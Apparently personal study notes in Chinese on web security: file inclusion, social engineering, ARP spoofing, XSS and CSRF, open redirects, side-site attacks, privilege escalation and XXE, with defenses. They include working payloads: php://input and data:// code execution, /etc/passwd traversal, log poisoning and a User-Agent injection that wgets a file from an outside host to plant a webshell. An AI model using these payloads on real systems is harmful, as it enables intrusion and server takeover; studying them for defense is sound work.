<p>文件包含漏洞的产生原因是在通过引入文件时，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p>
<p>当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。</p>
<p>当被包含的文件在远程服务器时，就形成的远程文件包含漏洞。</p>
<p>一些Web站点允许用户输入时指定文件流或允许用户上传文件到服务器。一段时间后web程序访问用户提供的文件。这样，web程序就会执行恶意程序。<br>
如果文件在本地叫做Local File Inclusion(LFI)，文件在其他主机上的攻击叫做Remote File Inclusion(RFI)。<br>
注意：file inclusion（文件包含）与arbitrary file access（任务文件访问）或file disclosure（文件泄露）不同。</p>
<p>漏洞防范：<br>
1.严格判断包含中的参数是否外部可控，因为文件包含漏洞利用成功与否的关键点在于被包含文件是否可以被外部控制<br>
2.路径限制：限制被包含的文件只能在某一文件夹内，禁止目录跳转字符如：&quot;../&quot;<br>
3.包含文件验证：验证被包含的文件是否是白名单中的一员<br>
4.尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include（&quot;test.php&quot;）；</p>
<p>思考与要点<br>
1.PHP中的四个文件包含函数(require,require_once,include,include_once)，因此在挖掘文件包含漏洞时只需要跟踪这四个函数的代码。<br>
2.php远程包含漏洞需要allow_url_include 为on<br>
3.挖掘文案金包含漏洞需要对代码有一定的基础<br>
4.文件包含漏洞dabufenchuxianzaiphp中，其他的如asp，asp.net，jsp也会存在，但相对很少</p>
<h1 id="详解文件包含">详解文件包含</h1>
<p><strong>文件包含原理</strong><br>
文件包含<br>
开发人员将相同的函数写入单独的文件中，需要使用某个函数时直接调用此文件，无需再次编写，这种文件调用的过程称文件包含</p>
<p>文件包含漏洞<br>
开发人员为了使代码更灵活，会将被包含的文件设置为变量，用来进行动态调用，从而导致客户端可以恶意调用一个恶意文件，造成文件包含漏洞</p>
<p>0x01文件包含分类<br>
本地文件包含<br>
包含服务器本身存在的恶意文件<br>
a.txt</p>
<pre><code>&lt;?php phpinfo();?&gt;
</code></pre>
<p>b.php</p>
<pre><code>&lt;?php
$b=$_GET['id'];
include($b);
?&gt;
</code></pre>
<p>payload:</p>
<pre><code>localhost/b.php?id=a.txt //返回phpinfo页面
</code></pre>
<p>注：<br>
两个文件在同一目录下（若不在同一目录这被包含的文件路径必须写绝对路径或相对路径）<br>
被包含的页面的后缀无论是什么都会当做PHP解析</p>
<p>远程文件包含<br>
包含其他网站上的恶意文件<br>
远程文件包含利用条件：</p>
<p>在php.ini中allow_url_fopen=on、allow_url_include=on</p>
<p>payload：</p>
<pre><code>localhost/b.php?id=http://ip/文件路径
</code></pre>
<p>注：</p>
<p>远程包含的文件路径必须是绝对路径</p>
<p>0x02 常用文件包含函数<br>
PHP</p>
<pre><code>include()
</code></pre>
<p>当使用该函数包含文件时，只有代码执行到include()函数是才将文件包含进来，发生错误时只给出一个警告，继续向下执行</p>
<pre><code>include_once()
</code></pre>
<p>功能和include()相同，区别在于当重复调用同意文件时，程序只调用一次</p>
<pre><code>requier()
</code></pre>
<p>使用require函数包含文件时，只要程序一执行，立即调用脚本；如果前者执行发生错误，函数或输出错误信息，并终止脚本运行</p>
<pre><code>require_once()
</code></pre>
<p>功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次</p>
<pre><code>jsp/servlet
ava.io.file()

java.io.filereader()

ASP
include file

include virtual

0x03 各个协议实现命令执行
%00截断
</code></pre>
<p>是否需要截断是根据包含函数后有没有对包含的文件进行拼接一个后缀，<br>
如果有就需要使用%00进行截断<br>
当php版本&lt;=5.2使用%00截断</p>
<p>file：//:用于访问本地文件系统</p>
<p>条件(php.ini)：</p>
<pre><code>allow_url_fopen   off/on
allow_url_include off/on
</code></pre>
<p>使用方法：<code>file：//[文件的绝对路径和文件名]</code></p>
<p>php://:访问各个输入输出流</p>
<p>php伪协议：<br>
php：//filter：用于读取源码并进行bash64编码输出；<br>
条件（php.ini）：<br>
allow_url_fope   off/on<br>
allow_url_include off/on</p>
<pre><code>php：//input：可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；
条件(php.ini)：
    allow_url_fope   off/on
    allow_url_include on

php://stdin是只读的，php://stdout 和 php://stderr 是只写的。
php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。
php://fd 允许直接访问指定的文件描述符。

zip://,bzip://,zlib://：均属于压缩流，可以访问压缩文件中的子文件，不需要传后缀名
</code></pre>
<p>条件：</p>
<pre><code>allow_url_fope   off/on
allow_url_include off/on
</code></pre>
<p>zip://使用方法：</p>
<pre><code>zip://[压缩文件绝对路径]#[压缩文件内的子文件名]
</code></pre>
<p>bzip2://使用方法：</p>
<pre><code>bzip2://file.bz2
</code></pre>
<p>zlib://使用方法：</p>
<pre><code>zlib://file.gz

data://
</code></pre>
<p>条件：</p>
<pre><code>allow_url_fope   on
allow_url_include on123
http://127.0.0.1/cmd.php?file=data://text/plain,&lt;?php phpinfo()?&gt;
http://127.0.0.1/cmd.php?file=data://text/plain;base644,加密的php代码
</code></pre>
<p>在这里插入图片描述</p>
<p>phar://:数据流包装器<br>
http:// 网址<br>
ftp:// 访问FTP url<br>
ssh2:// Secure Shell 2<br>
expect:// 处理交互式的流<br>
glod:// 查找匹配的文件路径</p>
<p>0x04 文件包含利用场景<br>
包含上传文件<br>
用户上传了一个可执行文件，通过文件包含那个文件实现漏洞利用<br>
防御：</p>
<pre><code>做好上传限制
隐藏好文件路径
设置访问权限、执行权限
</code></pre>
<p>伪协议<br>
php：//input：</p>
<p>用来接收POST数据。我们能够通过input把我们的语句输入上去然后执行。<br>
条件：</p>
<pre><code>php &lt;5.0 ，allow_url_include=Off 情况下也可以用
php &gt; 5.0，只有在allow_url_fopen=On 时才能使用
</code></pre>
<p>例：</p>
<pre><code>http：//localhost/include/file.php?file=php://input     //URL
&lt;?php fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;)?&gt;  //POST,创建一个文件a.php；并写入phpinfo
</code></pre>
<p>data://：</p>
<p>将原本的include的文件流重定向到了用户可控制的输入流中<br>
条件：</p>
<pre><code>allow_url_include=On
php &gt; 5.2
</code></pre>
<p>例：</p>
<pre><code>http://localhost/file.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==      //base64加密&lt;？php system(whoami);？&gt;；直接执行命令
http://localhost/image.php?imagedata=data://image/jpeg;base64,..... // 后面加上图片木马；图片命令执行
</code></pre>
<p>php://filter：</p>
<p>这个语句用来查看源码。直接包含php文件时会被解析，不能看到源码，所以用filter来读取，不过要先base64加密传输过<br>
例：</p>
<pre><code>http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=C:\oneword    //可以跟绝对路径也可以跟相对路径
http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=[http|https|ftp]://www.bbb.com/2.txt   //远程路径
</code></pre>
<p>防御：<br>
尽量使用安全版本的php<br>
做好php的安全配置<br>
对相应目录做相应权限设置</p>
<p>包含日志文件<br>
1、日志的默认路径<br>
/etc/httpd/logs/access_log或/var/log/httpd/access_log        //apache+linux<br>
D:xamppapachelogsaccess.log或D:xamppapachelogserror.log  //apache_win2003<br>
C:WINDOWSsystem32Logfiles                     //iis6.0+win2003<br>
%SystemDrive%inetpublogsLogFiles            //iis7.0+win2003<br>
nginx 日志文件在用户安装目录的logs目录下</p>
<p>2、web中间件默认配置uoh文件<br>
/etc/httpd/conf/httpd.conf或index.php?page=/etc/init.d/httpd        //apache+linux<br>
C:/Windows/system32/inetsrv/metabase.xml          //iis6.0+win2003<br>
C:WindowsSystem32inetsrvconfigapplicationHost.config           //iis7.0+win</p>
<p>3、利用<br>
访问http://www.xx.com/<?php phpinfo(); ?>时，<?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent；但是在日志里这句话被编码了；所以用Burp Suite修改来绕过编码；然后包含相应的日志文件：<br>
http://localhost/include/file.php?file=../../apache/logs/access.log //（这里利用相对路径，找到日志文件，并以php解析的方式打开)</p>
<p>4、防御<br>
隐藏或修改默认日志文件<br>
设置日志文件读取权限</p>
<p>包含/proc/self/environ<br>
1、找文件包含漏洞<br>
www.aaa.com/view.php?page=../<br>
www.aaa.com/view.php?page=../../../../../etc/passwd</p>
<p>2、检查proc/self/environ是否可以访问<br>
www.aaa.com/view.php?page=../../../../../proc/self/environ</p>
<p>3、如果可读就注入代码<br>
访问：www.aaa.com/view.php?page=../../../../../proc/self/environ<br>
选择User-Agent 写代码如下：<?system('wget http://www.yourweb.com/oneword.txt -O shell.php');?>    //提交请求；我们的命令将被执行(将下载http://www.yourweb.com/oneword.txt，并将其保存为它在shell.php网站目录)，我们的shell也就被创建,.如果不行，尝试使用exec()，因为系统可能被禁用的从php.ini网络服务器.</p>
<p>4、访问shell</p>
<p>5、防御：<br>
设置proc/self/environ不可访问</p>
<p>包含Session文件</p>
<pre><code>?file=../../../../../../tmp/sess_1sv3pu01f97dp3qcfef8i2b9r2         //读取session文件
</code></pre>
<p>0x05 常见的绕过与防御<br>
%00截断（php&lt;5.3.4）</p>
<p>说明：<br>
PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字节(x00)将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串。<br>
防御：<br>
禁用0字节</p>
<p>超长字符截断</p>
<p>利用：<br>
利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。<br>
我们知道目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。<br>
而利用&quot;./&quot;的方式即可构造出超长目录字符串<br>
防御：<br>
限制用户输入字符长度</p>
<p>任意目录遍历</p>
<p>利用：<br>
使用&quot;../../../&quot;这样的方式来返回到上层目录中，这种方式又被称为&quot;目录遍历(Path Traversal)&quot;。常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务器端的防御逻辑(WAF)<br>
防御：<br>
目录遍历漏洞是一种跨越目录读取文件的方法，但当PHP配置了open_basedir时，将很好地保护服务器，使得这种攻击无效。<br>
open_basedir的作用是限制在某个特定目录下PHP能打开的文件(有点像chroot的感觉)12345</p>
<p>问号截断</p>
<p>利用：</p>
<pre><code>http://localhost/FIleInclude/index.php?path=http://localhost/test/solution.php?
</code></pre>
<p>防御：<br>
关闭远程文件包含的配置选项allow_url_include = Off</p>
<p>0x06 防御总结<br>
1、无需情况下设置allow_url_include和allow_url_fopen为关闭<br>
2、对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir<br>
3、尽量不使用动态包含<br>
4、严格检查变量是否已经初始化。<br>
5、建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，<br>
进行严格的检查，参数中不允许出现../之类的目录跳转符。<br>
6、严格检查include类的文件包含函数中的参数是否外界可控。<br>
7、不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。<br>
8、在发布应用程序之前测试所有已知的威胁。</p>
<p>参考文章：https://blog.csdn.net/xg_ren/article/details/79040414</p>
<h1 id="社会工程学">社会工程学</h1>
<p>社会工程学简称社工，它是通过对受害者心里弱点，本能反应，好奇，信任，贪婪等心理陷阱进行诸如欺骗，伤害的一种危害手段<br>
他并不能等同于一般的欺骗手法，社会工程学尤其复杂，即使自认为是最警惕最小心的人，也一样会被高明的社会工程学的手段损害利益<br>
一个成功的社工师必然是拥有“读心术”的沟通专家，当然，也有人称其为骗子，间谍，社工师就是以这样的名义存在的，对社会工程学有了解的人都应该知道的一个名字-凯文米特尼克以及可以说是每个社工师都比看的一本书--欺骗的艺术</p>
<p><strong>社会工程学的基本特征</strong></p>
<p>社会工程学陷阱就是通常以交谈、欺骗、假冒或口语等方式，从合法用户中套取系统的秘密。</p>
<p>社会工程学是一种与普通的欺骗/诈骗不同层次的手法，因为社会工程学需要搜集大量的信息针对对方的实际情况，进行心理战术。</p>
<p>社会工程学往往是一种利用人性脆弱点，贪婪等等的心理表现进行攻击，是防不胜防的。</p>
<p><strong>生活中的社会工程学</strong></p>
<p>环境渗透（攻击者采取各种手段进入目标内部，然后利用各种便利条件进行观察或窃听，得到自己所需的信息）</p>
<p>身份伪造（隐藏真实身份，例如：伪造身份证、ID卡等）</p>
<p>冒名电话（冒充亲戚、朋友、同学、同事、 上司、下属、高级官员、知名人士等通过电话从目标处获取信息）</p>
<p>个体配合（如果目标内部人员已经心存不满甚至有了报复的念头，那么……）</p>
<p><strong>网络中的社会工程学</strong></p>
<p>地址欺骗<br>
邮件欺骗<br>
窗口欺骗<br>
其它欺骗</p>
<h1 id="arp欺骗攻击">arp欺骗攻击</h1>
<p>ARP是Address Resolution Protocol（地址解析协议）的缩写。在以太网中，两台主机想要通信就必须要知道目标主机的MAC地址，如何获取目标主机的MAC地址呢？这就是地址解析协议ARP的工作。</p>
<p><strong>攻击原理</strong><br>
有时候攻击者在入侵目标时，由于安全措施很到位，不能获得权限，而且服务器只有一个web站点，无法旁注，这时候攻击者就可能通过c段arp嗅探的方式，继续入侵指定的目标站点<br>
c段攻击就是指同一网关下的主机arp嗅探，在嗅探出敏感数据后继续实施对目标站点的渗透</p>
<p>eg：攻击者的目标站点为 www.sangfor.com.cn   服务器ip地址为 192.168.1.100</p>
<p>在无法直接渗透目标服务器时，攻击者就可能去入侵与192.168.1.100在同一网关下的服务器，一般会是192.168.1.x，也就是c段ip，在得到服务器权限后，对目标主机实施arp嗅探</p>
<p>用工具举例说明<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274869809.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274874148.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274878418.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274882340.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274887250.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274889821.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274893442.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274895920.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274899113.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274902464.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274909374.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626274912383.png" alt="" loading="lazy"></p>
<p>防御arp攻击<br>
1.静态绑定（对每台主机进行ip和mac地址静态绑定）<br>
2.arp防火墙</p>
<h1 id="2021-07-15">2021-07-15</h1>
<p><strong>xss危害简单概括</strong></p>
<p>网络钓鱼，包括盗取各类用户账号<br>
窃取用户cookie资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作<br>
劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账，强制发表日志，发送电子邮件等<br>
强制弹出广告页面，刷流量等<br>
网页挂马<br>
进行恶意操作，例如任意篡改页面信息，删除文章等<br>
进行大量的客户端攻击，如DDOS攻击<br>
获取客户端信息，例如用户的浏览历史，真实ip，开放端口等<br>
控制受害者机器向其他网站发起攻击<br>
结合其他漏洞进一步扩大攻击<br>
提升用户权限，包括进一步渗透网站<br>
传播XSS跨站脚本蠕虫等</p>
<p><strong>csrf跨站请求伪造</strong></p>
<p>原理：攻击者盗用了你的身份，以你的名义进行某些非法操作，csrf能够使用你的账户发送邮件，获取你的铭感信息甚至盗走你的财产</p>
<p>步骤：1.登陆受信任网站a，并在本地生成cookie<br>
2.在不登出a的情况下，访问恶意网站b</p>
<figure data-type="image" tabindex="20"><img src="https://jinqipiaopiao.github.io//post-images/1626312003724.png" alt="" loading="lazy"></figure>
<p>csrf与xss的区别：<br>
xss：<br>
攻击者发现xss漏洞--构造代码--发送给受害人--受害人打开--攻击者获取受害人的cookie--完成攻击<br>
攻击者需要登陆后台完成攻击</p>
<p>csf：攻击者发现csrf漏洞--构造代码--发送给受害人--受害人打开--受害人执行代码--完成攻击<br>
攻击时管理员自己实现的，攻击者只负责了构代码</p>
<p>csrf少了获取cookie的步骤，因为受害人在执行恶意代码的时候就已经完成了攻击而攻击者并没有参与进来</p>
<p><strong>漏洞分类</strong><br>
get：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626312012585.png" alt="" loading="lazy"></p>
<p>post：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626312017365.png" alt="" loading="lazy"></p>
<p>常见的csrf方式</p>
<pre><code>&lt;img&gt;标签属性
&lt;img src=“http://漏洞地址”&gt;

&lt;script&gt;标签属性
&lt;script src=“http://漏洞地址”&gt;

&lt;iframe&gt;标签属性
&lt;iframe src=“http://漏洞地址”&gt;

JavaScript方法
Image对象
&lt;script&gt;
var foo = new Image();
foo.src = “http://漏洞地址”
&lt;/script&gt;
</code></pre>
<p>防御：<br>
验证HTTP Referer字段<br>
Token验证<br>
添加验证码</p>
<h1 id="url重定向">url重定向</h1>
<p>由于应用越来越多的需要和其他的第三方应用交互，以及在自身应用内部根据不同的逻辑将用户引向到不同的页面，例如一个典型的登录接口就经常需要在认证成功之后将用户引导到登录之前的页面，整个过程中如果实现不好就可能导致一些安全问题，特定条件下可能引起严重的安全漏洞。</p>
<p><strong>客户端重定向：</strong><br>
用户浏览器的地址栏URL会用变化</p>
<p>http://www.test.com/test1.php<br>
点击“登录”后会指向<br>
http://www.test.com/login.php</p>
<p><strong>服务端重定向：</strong><br>
用户浏览器的地址栏URL不会变化</p>
<p>http://www.test.com/test1.php<br>
点击“登录”后浏览器的地址栏URL不会变化，但页面会变化</p>
<p>能够重定向道任意域名叫做自由重定向，自由重定向可能会导致用户在不知情的情况下被带到其他域名的网站，从而遭到钓鱼攻击</p>
<p>自由重定向示例：<br>
http://example.jp/?continue=http://trap.example.com/<br>
通过以上url跳转到http://trap.example.com/<br>
钓鱼攻击的常见手段为：将用户带到伪装成著名网站的恶意网站并诱使用户输入个人呢信息</p>
<p>攻击方式<br>
一个典型的登录跳转如下：</p>
<pre><code>&lt;?php
$url=$_GET['id'];
header(&quot;Location: $url&quot;);
?&gt;
</code></pre>
<p>id没有任何限制，因此提交</p>
<p>http://localhost/test.php?id=http://sangfor.com.cn</p>
<p>钓鱼攻击的利用<br>
Phishing Frenzy<br>
https://www.phishingfrenzy.com/<br>
https://github.com/pentestgeek/phishing-frenzy</p>
<p>Weeman<br>
https://github.com/Hypsurus/weeman<br>
Weeman</p>
<pre><code>help

show     : show default settings.
set         : set value for option (set &lt;option&gt; &lt;value&gt;).
run        : start the server.
clear      : clear screen.
help       : show help or (help &lt;option&gt;.)
framework   : load the modules framework.
quit        : quit.
</code></pre>
<p><strong>修复方案</strong><br>
加入referer的限制，保证该url的有效性，避免恶意用户自己生成跳转链接<br>
加入有效性验证token，避免用户生成自己的恶意链接从而被利用（但是如果功能本身要求比较开放，可能会产生一定的限制）<br>
设置严格白名单及网络边界，功能要求比较开放的情况下，需要严格限定协议以及可访问的网络</p>
<h1 id="旁注攻击提权思路">旁注攻击&amp;提权思路</h1>
<p>旁注攻击即攻击者在攻击目标时，对目标网站“无从下手”，找不到漏洞时候，攻击者就可能会通过具有同一服务器的网站渗透到目标网站，从而获取目标站点的权限。这一个过程就是旁注攻击的过程。</p>
<pre><code>  一般的虚拟空间，VPS（虚拟专用服务器）或与他人合租的服务器，也有一些企业的多个业务系统在同一服务器中。当多个网站放置在同一服务器时，目标网站设计得非常安全，但并不能保证同一服务器上的所有网站都是安全的。
</code></pre>
<p>VPS（Virtual Private Server 虚拟专用服务器）技术，将一台服务器分割成多个虚拟专享服务器的优质服务。实现VPS的技术分为容器 [1]  技术，和虚拟化技术 [2]  。在容器或虚拟机中，每个VPS都可分配独立公网IP地址、独立操作系统、实现不同VPS间磁盘空间、内存、CPU资源、进程和系统配置的隔离，为用户和应用程序模拟出“独占”使用计算资源的体验。VPS可以像独立服务器一样，重装操作系统，安装程序，单独重启服务器。VPS为使用者提供了管理配置的自由，可用于企业虚拟化，也可以用于IDC资源租用。</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1626315944733.png" alt="" loading="lazy"><br>
如图所示：一个服务器可能存在多个网站或者多个数据库，如test1.com test2.com test3.com test4.com，web应用程序分别在D盘的test1 test2 test3 test4 目录中，分别使用了mysql和sqlserver两种数据库。<br>
那么，当目标test1没发现漏洞时，而在test2中发现了漏洞获取了mysql的root权限，那就能直接影响到test1的数据库<br>
那么，当目标为test3时，因不同的数据库关系，这时就得对服务器进行提权了</p>
<p><strong>方法</strong></p>
<p>1.IP逆向查询<br>
通过IP逆向查询可以查到部署在同一web服务器上的其他网站<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626316044451.png" alt="" loading="lazy"><br>
如常用的查询站点：<br>
http://www.yougetsignal.com/tools/web-sites-on-web-server/<br>
http://s.tool.chinaz.com/same<br>
http://www.114best.com/ip/<br>
http://dns.aizhan.com/</p>
<p>2.CDN查询<br>
说到旁注攻击，就不得不提起CDN，服务器使用CDN之后，真实的IP将会隐藏起来，攻击者无法找到目标主句的，也就无法进行旁注攻击。CDN即内容分发网络，其基本思路是：尽可能地避开互联网上有可能影响数据传输速度和稳定性的瓶颈，环节，使内容的传输速度更快，更稳定</p>
<p>1.网站查询<br>
http://www.cdnplanet.com/tools/cdnfinder/<br>
http://www.17ce.com/<br>
2.分析二级域名的解析地址<br>
3.分析服务器IP的历史变化<br>
http://toolbar.netcraft.com/<br>
4.查找隐藏在网站目录类似phpinfo()的函数页面，能直接显示出服务器的相关     配置，看目录扫描的自带强大程度</p>
<p><strong>提权简述</strong></p>
<p>提权是将服务器的普通用户提升为管理员用户的一种操作，提权常常用于旁注。<br>
例如：攻击者己经获取到目标网站的同一服务器的任意网站，通过对服务器提权拿到了服务器管理员权限，当拥有服务器的管理员权限后，几乎可以对服务器进行任何操作，更何况是服务器上存放的一个网站呢？换句话说，有时旁注攻击成功的关键就是看服务器提权成功与否。</p>
<p>攻击者对服务器提权一般分为两种：<br>
一种是溢出提权，另一种是第三方组件提权。（其他的：社工提权）</p>
<p>溢出提权</p>
<p>是指攻击者利用系统本身或系统中软件的漏洞来获取root权限，其中溢出提权又分为远程溢出和本地溢出<br>
远程溢出是指攻击者只需与服务器建立连接，然后根据系统漏洞，使用相应的溢出程序，即可获取到远程服务器的root权限，例如知名的ms-08067<br>
本地溢出是主流的提权方式，攻击者通常会向服务器上传本地溢出程序在服务器指执行，如果系统村子啊漏洞，那么将会溢出root权限</p>
<figure data-type="image" tabindex="21"><img src="https://jinqipiaopiao.github.io//post-images/1626316783900.png" alt="" loading="lazy"></figure>
<h1 id="2021-07-19">2021-07-19</h1>
<h1 id="网络安全绪论">网络安全绪论</h1>
<p>**攻击的过程：**准备阶段，实施阶段，售后阶段<br>
准备阶段：确定攻击目标，信息收集，服务分析，系统分析，漏洞分析<br>
实施阶段：缓冲区溢出，拒绝服务，后门，木马，病毒<br>
售后阶段：留下后门，隐藏踪迹</p>
<p>**防护措施：**个人防护措施，常用的防护措施<br>
个人防护措施：防火墙，加密重要文件，杀毒软件定期升级和杀毒，定期备份系统或重要文件，定期升级补丁<br>
常用的防护措施：完善安全管理制度，采取访问控制措施，运行数据加密措施，数据备份与恢复</p>
<p>**现状：**攻击者需要的技术水平逐渐降低，手段更加灵活，联合攻击急剧增多</p>
<p>**0day漏洞：**在安全补丁发布前被了解和掌握的漏洞信息</p>
<p>**设计准则：**木桶原则，整体性原则，安全性评价与平衡原则，标准化与一致性原则，技术与管理相结合原则，统筹规划分步实施原则，等级性原则，动态发展原则，易操作原则</p>
<p>**威胁信息系统的主要方法：**冒充，旁路控制，破化信息的完整性，破坏系统的可用性，重放，截收和辐射侦探，陷门，特洛伊木马，抵赖</p>
<p>**挂马：**通过各种手段，SQL注入，网站敏感文件扫描，服务器漏洞，网站程序0day，等各种方法获得管理员账户，登陆网站后台，或者webshell，修改网站的内容上传木马等。</p>
<p>**安全策略：**定义，目的，必要性，基本原则<br>
定义：针对那么些被允许进入某一组，可以访问网站技术资源和信息资源所规定，必须遵守的规则<br>
目的：觉得一个组织机构应该怎样保护自己，阐明机构安全政策的总体思想，让所有用户，操作人员和管理员清楚，为了保护技术和信息资源所必须遵守的原则，提供一个可获得，能够配置和检查的用于确定是否与计算机和网络系统的策略一致的基准<br>
必要性：强调了策略的核心作用，强调了检测，响应，防护的动态性，检测，响应，防护必须遵循的安全策略进行<br>
基本原则：适用性，可行性，动态性，简单性，系统性</p>
<p>**定义：**基本定义，简单说明，包括<br>
定义：系统硬件，软件受到保护，不因偶然恶意的破坏，更改，泄露，能连续，可靠正常的运行，服务不中断<br>
简单说明：能够识别和消除不安全因素的能力<br>
包括：运行系统的安全，网络上系统信息的安全，网络上信息传播的安全</p>
<p>**体系层次：**物理层安全，系统层安全，网络层安全，应用层安全，管理层安全</p>
<p>**基本需求：**可靠性，可用性，保密性，不可抵赖性，可控性，可审查性，真实性</p>
<p>**威胁的主要因素：**信息系统自身安全的脆弱性，操作系统与应用程序漏洞，安全管理问题，黑客攻击，网络犯罪</p>
<p><strong>黑客入侵行为模型图：</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626663738651.png" alt="" loading="lazy"></p>
<p>解说：黑客入侵一般的完整模式为：踩点-&gt;扫描-&gt;查点-&gt;分析并入侵-&gt;获取权限-&gt;提升权限-&gt;扩大范围-&gt;安装后门-&gt;清除日志，这几个大的行为模块<br>
资源扩张：指利用已获得的密码尝试登陆其他主机或者其他服务<br>
其他手段：值类似于发送E-mail的方式，比如通过恶意网页等其他欺骗方式。还包括进来一些利用winnt/2k会话缺陷在远程嗅探其密码的新攻击方法<br>
踩点：大多数的dns服务器允许用户获取域名记录文件内容，这样就可以了解到网站的详细网络分布结构。另外网络服务商可以查询得到公司地址及人员内部邮件，电话等等，以及单位注册的ip范围等重要信息。又是这一步骤会比扫描还重要</p>
<h1 id="xxexml-external-entity-attackxml外部实体注入攻击">XXE(XML External Entity attack)XML外部实体注入攻击</h1>
<p>导语<br>
　　XXE：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。例如PHP中的simplexml_load 默认情况下会解析外部实体，有XXE漏洞的标志性函数为simplexml_load_string（）。</p>
<p>尽管XXE漏洞已经存在了很多年，但是它从来没有获得它应有的关注度。很多XML的解析器默认是含有XXE漏洞的，这意味着开发人员有责任确保这些程序不受此漏洞的影响。 比如今年7月刚爆出的微信支付XXE漏洞案例。</p>
<p>libxml2.9.1及以后，默认不解析外部实体。可以在此了解libxml各版本具体改动情况。本次测试在Window下使用的php5.4.45(libxml Version 2.7.8)。Linux中需要将libxml低于libxml2.9.1的版本编译到PHP中，可以使用phpinfo()查看libxml的版本信息。当XML声明中standalone值是yes的时候表示DTD仅用于验证文档结构，外部实体将被禁用。但它的默认值是no，而且有些parser会直接忽略这一项。</p>
<p>XML外部实体<br>
　　本文主要讲外部实体注入攻击，所以基本的XML语法就不过多的描述。主要看一下DTD-实体。</p>
<p>首先让我们了解一下基本的PAYLOAD结构：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702514550.png" alt="" loading="lazy"><br>
DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626832773670.png" alt="" loading="lazy"><br>
<strong>实体分为一般实体和参数实体</strong></p>
<p>1.一般实体的声明：<!ENTITY 实体名称 "实体内容"></p>
<p>引用一般实体的方法：&amp;实体名称;</p>
<p>p.s.经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。</p>
<p>2.参数实体的声明：<!ENTITY % 实体名称 "实体内容"></p>
<p>引用参数实体的方法：%实体名称;</p>
<p>p.s.经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。</p>
<p>如果实体名称中出现如&lt;的特殊字符，解析就会失败。为了避免这种情况，XML用实体引用替换特殊字符。XML预定义了五个实体引用，即用&lt;、 &gt;、 &amp;、 &amp;apos、 &quot;替换&lt;、&gt;、&amp;、'、&quot;。</p>
<p><strong>DTD实体声明（重点</strong>）</p>
<p><strong>1.内部实体声明</strong></p>
<p><!ENTITY 实体名称 "实体的值"></p>
<p>当引用一般实体时，由三部分构成：&amp;、实体名、；，当是用参数传入xml的时候，&amp;需URL编码，不然&amp;会被认为是参数间的连接符号。</p>
<p>示例：</p>
<pre><code>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
&lt;!DOCTYPE test [
&lt;!ENTITY writer &quot;Dawn&quot;&gt;
&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;
]&gt;
&lt;test&gt;&amp;writer;©right;&lt;/test&gt;
</code></pre>
<p><strong>2. 外部实体声明</strong></p>
<pre><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;
</code></pre>
<p>外部实体可支持http、file等协议。不同程序支持的协议不同，如下图：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702482719.png" alt="" loading="lazy"><br>
其中PHP支持的协议会更多一些，但是需要一定的扩展支持：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702456017.png" alt="" loading="lazy"><br>
　示例：</p>
<pre><code>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
&lt;!DOCTYPE test [
